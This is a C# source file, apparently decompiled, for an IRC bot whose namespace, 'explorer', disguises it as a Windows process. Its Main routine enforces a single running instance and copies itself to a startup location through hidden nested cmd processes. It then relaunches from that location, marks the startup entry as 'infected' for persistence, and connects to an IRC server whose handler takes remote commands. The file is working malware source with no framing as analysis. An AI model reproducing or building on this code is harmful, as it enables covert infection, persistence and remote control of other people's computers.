using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace explorer;

internal static class bot
{
	[STAThread]
	private static void Main()
	{
		InstanceUnique instanceUnique = new InstanceUnique("{" + config.mutex + "}");
		if (instanceUnique.IsRunning())
		{
			Process.GetCurrentProcess().Kill();
		}
		if (!config.truedebug && Application.get_ExecutablePath() != config.infecting_startup_pathexe)
		{
			Process process = new Process();
			process.EnableRaisingEvents = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "cmd";
			process.StartInfo.Arguments = "/c cmd /c cmd /c cmd /c copy \"" + Application.get_ExecutablePath() + "\" \"" + config.infecting_startup_pathexe + "\"";
			process.Start();
			process.WaitForExit();
			Process process2 = new Process();
			process2.EnableRaisingEvents = false;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/c cmd /c \"" + config.infecting_startup_pathexe + "\"";
			process2.Start();
		}
		if (Application.get_ExecutablePath() == config.infecting_startup_pathexe || config.truedebug)
		{
			if (!misc.startupIsInfected(config.infecting_startup_name))
			{
				misc.setInfected(config.infecting_startup_name, config.infecting_startup_pathexe, value: true);
			}
			irc irc2 = new irc(config.host, config.port, makeThread: true);
			irc2.setHandler(new messhandler());
		}
	}
}
